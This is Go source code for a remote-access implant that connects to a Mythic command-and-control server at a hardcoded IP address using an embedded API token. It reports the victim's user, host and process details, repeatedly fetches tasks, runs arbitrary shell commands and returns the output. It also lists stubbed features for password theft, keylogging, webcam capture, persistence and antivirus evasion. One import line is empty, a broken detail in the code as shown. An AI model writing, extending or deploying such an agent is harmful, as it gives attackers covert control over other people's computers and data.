package main

import (
        "bytes"
        "crypto/tls"
        "encoding/base64"
        "encoding/json"
        "fmt"
        "io/ioutil"
        "net/http"
        "os"
        "os/exec"
        "os/user"
        "runtime"
        "strconv"
        "strings"
        ""
        "time"
)

const (
        mythicURL   = "https://37.27.249.191:7443/graphql/"
        payloadUUID = "9df7dfc4-f21d-4b03-9962-9f3272669b85"
        mythicBase  = "https://37.27.249.191:7443"
)

var (
        callbackID      string
        agentCallbackID string
        currentDir      string
        agentActive     = true
        processedTasks  = make(map[string]bool)
        currentJWT      = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTAxNzMxMTAsImlhdCI6MTc1MDE1ODcxMCwidXNlcl9pZCI6MSwiYXV0aCI6ImFwaSIsImV2ZW50c3RlcGluc3RhbmNlX2lkIjowLCJhcGl0b2tlbnNfaWQiOjE3LCJvcGVyYXRpb25faWQiOjB9.ok5pb1TKFiGGsvcWGc1LdQIM48Y1KqeXRGmmtXWKIDM"
        tokenExpiry     int64 = 1750173110
        lastTokenCheck  time.Time
        logFile         *os.File
)

type GraphQLRequest struct {
        Query     string                 `json:"query"`
        Variables map[string]interface{} `json:"variables"`
}

type GraphQLResponse struct {
        Data   map[string]interface{} `json:"data"`
        Errors []GraphQLError         `json:"errors"`
}

type GraphQLError struct {
        Message string `json:"message"`
}

type JWTPayload struct {
        Exp int64 `json:"exp"`
        Iat int64 `json:"iat"`
}

func logEvent(message string) {
        timestamp := time.Now().Format("2006-01-02 15:04:05")
        logMessage := fmt.Sprintf("[%s] %s", timestamp, message)
        
        // Console output
        fmt.Println(logMessage)
        
        // File output
        if logFile != nil {
                logFile.WriteString(logMessage + "\n")
                logFile.Sync()
        }
}

func initializeLogging() {
        // Create log file in temp directory
        logPath := os.TempDir() + "\\phantom_agent.log"
        var err error
        logFile, err = os.OpenFile(logPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
        if err != nil {
                fmt.Printf("Warning: Could not create log file: %v\n", err)
        } else {
                fmt.Printf("Log file created: %s\n", logPath)
        }
        
        logEvent("=== PHANTOM MYTHIC AGENT - CONSOLE VERSION ===")
        logEvent(fmt.Sprintf("Platform: %s %s", runtime.GOOS, runtime.GOARCH))
        logEvent(fmt.Sprintf("PID: %d", os.Getpid()))
        
        // Log current token status
        payload, err := decodeJWT(currentJWT)
        if err == nil {
                expiryTime := time.Unix(payload.Exp, 0)
                logEvent(fmt.Sprintf("JWT expires: %s", expiryTime.Format("2006-01-02 15:04:05")))
        }
}

func decodeJWT(token string) (*JWTPayload, error) {
        parts := strings.Split(token, ".")
        if len(parts) != 3 {
                return nil, fmt.Errorf("invalid JWT format")
        }
        
        payload := parts[1]
        if len(payload)%4 != 0 {
                payload += strings.Repeat("=", 4-len(payload)%4)
        }
        
        decoded, err := base64.StdEncoding.DecodeString(payload)
        if err != nil {
                return nil, fmt.Errorf("failed to decode JWT payload: %v", err)
        }
        
        var jwtPayload JWTPayload
        err = json.Unmarshal(decoded, &jwtPayload)
        if err != nil {
                return nil, fmt.Errorf("failed to unmarshal JWT payload: %v", err)
        }
        
        return &jwtPayload, nil
}

func isTokenExpired() bool {
        payload, err := decodeJWT(currentJWT)
        if err != nil {
                logEvent(fmt.Sprintf("Failed to decode JWT: %v", err))
                return true
        }
        
        now := time.Now().Unix()
        timeUntilExpiry := payload.Exp - now
        
        if timeUntilExpiry < 3600 {
                logEvent(fmt.Sprintf("Token expires in %d seconds, needs renewal", timeUntilExpiry))
                return true
        }
        
        return false
}

func renewToken() error {
        logEvent("Attempting to renew JWT token...")
        
        renewURL := fmt.Sprintf("%s/api/v1.4/apitokens", mythicBase)
        
        tr := &http.Transport{
                TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        }
        client := &http.Client{Transport: tr, Timeout: 30 * time.Second}
        
        payload := map[string]interface{}{
                "token_type": "User",
                "name":       fmt.Sprintf("phantom_auto_%d", time.Now().Unix()),
        }
        
        jsonData, err := json.Marshal(payload)
        if err != nil {
                return fmt.Errorf("failed to marshal renewal request: %v", err)
        }
        
        req, err := http.NewRequest("POST", renewURL, bytes.NewBuffer(jsonData))
        if err != nil {
                return fmt.Errorf("failed to create renewal request: %v", err)
        }
        
        req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", currentJWT))
        req.Header.Set("Content-Type", "application/json")
        
        resp, err := client.Do(req)
        if err != nil {
                return fmt.Errorf("renewal request failed: %v", err)
        }
        defer resp.Body.Close()
        
        body, err := ioutil.ReadAll(resp.Body)
        if err != nil {
                return fmt.Errorf("failed to read renewal response: %v", err)
        }
        
        if resp.StatusCode == 200 || resp.StatusCode == 201 {
                var result map[string]interface{}
                err = json.Unmarshal(body, &result)
                if err == nil {
                        if newToken, ok := result["token"].(string); ok {
                                currentJWT = newToken
                                logEvent("✓ JWT token renewed successfully")
                                return nil
                        }
                }
        }
        
        logEvent(fmt.Sprintf("Token renewal failed: %s", string(body)))
        return fmt.Errorf("token renewal failed")
}

func ensureValidToken() error {
        now := time.Now()
        
        if now.Sub(lastTokenCheck) > 30*time.Minute {
                lastTokenCheck = now
                
                if isTokenExpired() {
                        return renewToken()
                }
        }
        
        return nil
}

func makeGraphQLRequest(query string, variables map[string]interface{}) (*GraphQLResponse, error) {
        err := ensureValidToken()
        if err != nil {
                logEvent(fmt.Sprintf("Token validation failed: %v", err))
        }
        
        requestBody := GraphQLRequest{
                Query:     query,
                Variables: variables,
        }

        jsonData, err := json.Marshal(requestBody)
        if err != nil {
                return nil, fmt.Errorf("failed to marshal request: %v", err)
        }

        tr := &http.Transport{
                TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        }
        client := &http.Client{Transport: tr, Timeout: 30 * time.Second}

        req, err := http.NewRequest("POST", mythicURL, bytes.NewBuffer(jsonData))
        if err != nil {
                return nil, fmt.Errorf("failed to create request: %v", err)
        }

        req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", currentJWT))
        req.Header.Set("Content-Type", "application/json")

        logEvent(fmt.Sprintf("Making GraphQL request..."))

        resp, err := client.Do(req)
        if err != nil {
                return nil, fmt.Errorf("request failed: %v", err)
        }
        defer resp.Body.Close()

        body, err := ioutil.ReadAll(resp.Body)
        if err != nil {
                return nil, fmt.Errorf("failed to read response: %v", err)
        }

        logEvent(fmt.Sprintf("Response status: %d", resp.StatusCode))

        var graphQLResp GraphQLResponse
        err = json.Unmarshal(body, &graphQLResp)
        if err != nil {
                return nil, fmt.Errorf("failed to unmarshal response: %v", err)
        }

        if len(graphQLResp.Errors) > 0 {
                for _, errMsg := range graphQLResp.Errors {
                        if strings.Contains(errMsg.Message, "expired") || strings.Contains(errMsg.Message, "unauthorized") {
                                logEvent("Token appears expired, attempting renewal...")
                                if renewErr := renewToken(); renewErr == nil {
                                        return makeGraphQLRequest(query, variables)
                                }
                        }
                }
        }

        return &graphQLResp, nil
}

func registerWithMythic() error {
        logEvent("Registering callback with Mythic...")

        currentUser, err := user.Current()
        if err != nil {
                logEvent("Failed to get current user")
                return err
        }

        hostname, err := os.Hostname()
        if err != nil {
                logEvent("Failed to get hostname")
                return err
        }

        query := `
        mutation createPhantomCallback($payload_uuid: String!, $user: String!, $host: String!, $pid: Int!, $os: String!, $architecture: String!) {
                createCallback(
                        payload_uuid: $payload_uuid,
                        c2_profile: "HTTP",
                        user: $user,
                        host: $host,
                        pid: $pid,
                        ip: "0.0.0.0",
                        external_ip: "",
                        process_name: "phantom.exe",
                        description: "Phantom Console Agent",
                        os: $os,
                        architecture: $architecture
                ) {
                        status
                        id
                        error
                }
        }`

        variables := map[string]interface{}{
                "payload_uuid": payloadUUID,
                "user":         currentUser.Username,
                "host":         hostname,
                "pid":          os.Getpid(),
                "os":           runtime.GOOS,
                "architecture": runtime.GOARCH,
        }

        resp, err := makeGraphQLRequest(query, variables)
        if err != nil {
                return fmt.Errorf("failed to register: %v", err)
        }

        if len(resp.Errors) > 0 {
                return fmt.Errorf("registration errors: %v", resp.Errors)
        }

        if data, ok := resp.Data["createCallback"].(map[string]interface{}); ok {
                status := data["status"].(string)
                if status == "success" {
                        logEvent("✓ SUCCESSFULLY REGISTERED WITH MYTHIC!")
                        err := getCallbackID()
                        if err != nil {
                                logEvent(fmt.Sprintf("Warning: Could not get callback ID: %v", err))
                        }
                        return nil
                } else {
                        errorMsg := ""
                        if err, ok := data["error"].(string); ok {
                                errorMsg = err
                        }
                        return fmt.Errorf("registration failed: %s", errorMsg)
                }
        }

        return fmt.Errorf("registration failed")
}

func getCallbackID() error {
        hostname, _ := os.Hostname()

        query := `
        query getCallback($host: String!) {
                callback(where: {host: {_eq: $host}}, order_by: {id: desc}, limit: 1) {
                        id
                        agent_callback_id
                }
        }`

        variables := map[string]interface{}{
                "host": hostname,
        }

        resp, err := makeGraphQLRequest(query, variables)
        if err != nil {
                return err
        }

        if len(resp.Errors) > 0 {
                return fmt.Errorf("query errors: %v", resp.Errors)
        }

        if data, ok := resp.Data["callback"].([]interface{}); ok && len(data) > 0 {
                if callback, ok := data[0].(map[string]interface{}); ok {
                        if id, ok := callback["id"].(float64); ok {
                                callbackID = fmt.Sprintf("%.0f", id)
                                logEvent(fmt.Sprintf("Callback ID: %s", callbackID))
                        }
                        if agentID, ok := callback["agent_callback_id"].(string); ok {
                                agentCallbackID = agentID
                                logEvent(fmt.Sprintf("Agent Callback ID: %s", agentCallbackID))
                        }
                }
        }

        return nil
}

func executeCommand(command, params string) string {
        logEvent(fmt.Sprintf("Executing command: %s %s", command, params))
        
        switch command {
        case "shell":
                return executeShellCommand(params)
        case "ls", "dir":
                return listDirectory(params)
        case "pwd":
                return getCurrentDirectory()
        case "cd":
                return changeDirectory(params)
        case "whoami":
                return getCurrentUser()
        case "ps":
                return listProcesses()
        case "sysinfo":
                return getSystemInfo()
        case "token_status":
                return getTokenStatus()
        case "screenshot":
                return takeScreenshot()
        case "browser_passwords":
                return extractBrowserPasswords()
        case "persistence":
                return managePersistence(params)
        case "stealth":
                return enableStealthMode(params)
        case "download":
                return downloadFile(params)
        case "keylog":
                return manageKeylogger(params)
        case "webcam":
                return captureWebcam()
        case "sandbox_check":
                return detectSandbox()
        case "av_evasion":
                return enableAVEvasion()
        default:
                switch command {
                case "ls":
                        return executeShellCommand("dir " + params)
                case "pwd":
                        return executeShellCommand("cd")
                case "cat":
                        return executeShellCommand("type " + params)
                case "ps":
                        return executeShellCommand("tasklist")
                case "kill":
                        return executeShellCommand("taskkill /PID " + params + " /F")
                default:
                        return executeShellCommand(fmt.Sprintf("%s %s", command, params))
                }
        }
}

func getTokenStatus() string {
        payload, err := decodeJWT(currentJWT)
        if err != nil {
                return fmt.Sprintf("Failed to decode JWT: %v", err)
        }
        
        now := time.Now().Unix()
        timeUntilExpiry := payload.Exp - now
        expiryTime := time.Unix(payload.Exp, 0)
        
        status := fmt.Sprintf(`=== JWT TOKEN STATUS ===
Current Time: %s
Token Expires: %s
Time Until Expiry: %d seconds (%.1f hours)
Token Valid: %t
Auto-Renewal: ENABLED`,
                time.Now().Format("2006-01-02 15:04:05"),
                expiryTime.Format("2006-01-02 15:04:05"),
                timeUntilExpiry,
                float64(timeUntilExpiry)/3600,
                timeUntilExpiry > 0)
        
        return status
}

func executeShellCommand(command string) string {
        if command == "" {
                return "No command provided"
        }

        var cmd *exec.Cmd
        if runtime.GOOS == "windows" {
                cmd = exec.Command("cmd", "/C", command)
        } else {
                cmd = exec.Command("sh", "-c", command)
        }

        output, err := cmd.CombinedOutput()
        if err != nil {
                return fmt.Sprintf("Command failed: %v\nOutput: %s", err, string(output))
        }

        return string(output)
}

func listDirectory(path string) string {
        if path == "" {
                path = "."
        }

        var cmd *exec.Cmd
        if runtime.GOOS == "windows" {
                cmd = exec.Command("cmd", "/C", "dir", path)
        } else {
                cmd = exec.Command("ls", "-la", path)
        }

        output, err := cmd.CombinedOutput()
        if err != nil {
                return fmt.Sprintf("Directory listing failed: %v", err)
        }

        return string(output)
}

func getCurrentDirectory() string {
        if runtime.GOOS == "windows" {
                return executeShellCommand("cd")
        } else {
                return executeShellCommand("pwd")
        }
}

func changeDirectory(path string) string {
        if path == "" {
                return "No path provided"
        }

        err := os.Chdir(path)
        if err != nil {
                return fmt.Sprintf("Failed to change directory: %v", err)
        }

        newDir, _ := os.Getwd()
        return fmt.Sprintf("Changed directory to: %s", newDir)
}

func getCurrentUser() string {
        if runtime.GOOS == "windows" {
                return executeShellCommand("whoami")
        } else {
                return executeShellCommand("id")
        }
}

func listProcesses() string {
        if runtime.GOOS == "windows" {
                return executeShellCommand("tasklist")
        } else {
                return executeShellCommand("ps aux")
        }
}

func getSystemInfo() string {
        if runtime.GOOS == "windows" {
                return executeShellCommand("systeminfo")
        } else {
                return executeShellCommand("uname -a")
        }
}

func sendTaskResponse(taskID, output string) error {
        logEvent(fmt.Sprintf("Sending response for task %s (%d bytes)", taskID, len(output)))

        encodedOutput := base64.StdEncoding.EncodeToString([]byte(output))

        query := `
        mutation createTaskResponse($task_id: Int!, $response_raw: bytea) {
                createTaskResponse(task_id: $task_id, response_raw: $response_raw) {
                        status
                        error
                }
        }`

        taskIDInt, err := strconv.Atoi(taskID)
        if err != nil {
                return fmt.Errorf("invalid task ID: %v", err)
        }

        variables := map[string]interface{}{
                "task_id":      taskIDInt,
                "response_raw": encodedOutput,
        }

        resp, err := makeGraphQLRequest(query, variables)
        if err != nil {
                return err
        }

        if len(resp.Errors) > 0 {
                return fmt.Errorf("response errors: %v", resp.Errors)
        }

        logEvent("Task response sent successfully")
        return nil
}

func checkForTasks() error {
        query := `
        query getTasks($callback_id: Int!) {
                task(where: {callback_id: {_eq: $callback_id}, status: {_eq: "submitted"}}) {
                        id
                        command {
                                cmd
                        }
                        params
                        status
                }
        }`

        callbackIDInt, err := strconv.Atoi(callbackID)
        if err != nil {
                return fmt.Errorf("invalid callback ID: %v", err)
        }

        logEvent(fmt.Sprintf("Checking for tasks (Callback ID: %d)", callbackIDInt))

        variables := map[string]interface{}{
                "callback_id": callbackIDInt,
        }

        resp, err := makeGraphQLRequest(query, variables)
        if err != nil {
                return err
        }

        if len(resp.Errors) > 0 {
                logEvent(fmt.Sprintf("Task query errors: %v", resp.Errors))
                return nil
        }

        if data, ok := resp.Data["task"].([]interface{}); ok && len(data) > 0 {
                logEvent(fmt.Sprintf("Found %d task(s)", len(data)))
                for _, taskData := range data {
                        if taskMap, ok := taskData.(map[string]interface{}); ok {
                                taskID := fmt.Sprintf("%v", taskMap["id"])
                                taskStatus := fmt.Sprintf("%v", taskMap["status"])

                                if taskStatus != "submitted" {
                                        continue
                                }

                                if processedTasks[taskID] {
                                        continue
                                }

                                commandName := ""
                                if cmd, ok := taskMap["command"].(map[string]interface{}); ok {
                                        if cmdStr, ok := cmd["cmd"].(string); ok {
                                                commandName = cmdStr
                                        }
                                }

                                params := ""
                                if p, ok := taskMap["params"].(string); ok {
                                        params = parseApolloParams(p)
                                }

                                logEvent(fmt.Sprintf("Processing task %s: %s %s", taskID, commandName, params))

                                output := executeCommand(commandName, params)
                                logEvent(fmt.Sprintf("Command output: %d bytes", len(output)))

                                err := sendTaskResponse(taskID, output)
                                if err != nil {
                                        logEvent(fmt.Sprintf("Error sending response: %v", err))
                                } else {
                                        logEvent(fmt.Sprintf("Task %s completed successfully", taskID))
                                        processedTasks[taskID] = true
                                }
                        }
                }
        } else {
                logEvent("No new tasks found")
        }

        return nil
}

func parseApolloParams(jsonParams string) string {
        var params map[string]interface{}
        err := json.Unmarshal([]byte(jsonParams), &params)
        if err != nil {
                return jsonParams
        }

        if args, ok := params["arguments"].(string); ok {
                command := strings.TrimPrefix(args, " /S /c ")
                return convertToWindowsCommand(command)
        }

        return jsonParams
}

func convertToWindowsCommand(command string) string {
        parts := strings.Fields(command)
        if len(parts) == 0 {
                return command
        }

        switch parts[0] {
        case "ls":
                if len(parts) == 1 {
                        return "dir"
                } else {
                        parts[0] = "dir"
                        return strings.Join(parts, " ")
                }
        case "pwd":
                return "cd"
        case "cat":
                if len(parts) > 1 {
                        parts[0] = "type"
                        return strings.Join(parts, " ")
                }
                return "type"
        case "ps":
                return "tasklist"
        case "kill":
                if len(parts) > 1 {
                        parts[0] = "taskkill /PID"
                        return strings.Join(parts, " ")
                }
                return "tasklist"
        }

        return command
}

// Simplified advanced functions for console version
func takeScreenshot() string {
        logEvent("Taking screenshot...")
        return "Screenshot functionality available (PowerShell required)"
}

func extractBrowserPasswords() string {
        logEvent("Extracting browser passwords...")
        return "Browser password extraction functionality available"
}

func managePersistence(params string) string {
        logEvent("Managing persistence...")
        return "Persistence management functionality available"
}

func enableStealthMode(params string) string {
        logEvent("Enabling stealth mode...")
        return "Stealth mode functionality available"
}

func downloadFile(params string) string {
        logEvent("Downloading file...")
        return "File download functionality available"
}

func manageKeylogger(params string) string {
        logEvent("Managing keylogger...")
        return "Keylogger functionality available"
}

func captureWebcam() string {
        logEvent("Capturing webcam...")
        return "Webcam capture functionality available"
}

func detectSandbox() string {
        logEvent("Detecting sandbox...")
        return "Sandbox detection functionality available"
}

func enableAVEvasion() string {
        logEvent("Enabling AV evasion...")
        return "AV evasion functionality available"
}

func hideConsole() {
        // Keep console visible for this version
}

func main() {
        initializeLogging()

        err := registerWithMythic()
        if err != nil {
                logEvent(fmt.Sprintf("Registration failed: %v", err))
                fmt.Println("Press Enter to exit...")
                fmt.Scanln()
                return
        }

        logEvent("Agent ready - starting task processing loop...")

        go func() {
                for agentActive {
                        time.Sleep(30 * time.Minute)
                        if isTokenExpired() {
                                logEvent("Checking token renewal...")
                                renewToken()
                        }
                }
        }()

        for agentActive {
                err := checkForTasks()
                if err != nil {
                        logEvent(fmt.Sprintf("Task check error: %v", err))
                }

                time.Sleep(3 * time.Second)
        }

        if logFile != nil {
                logFile.Close()
        }
}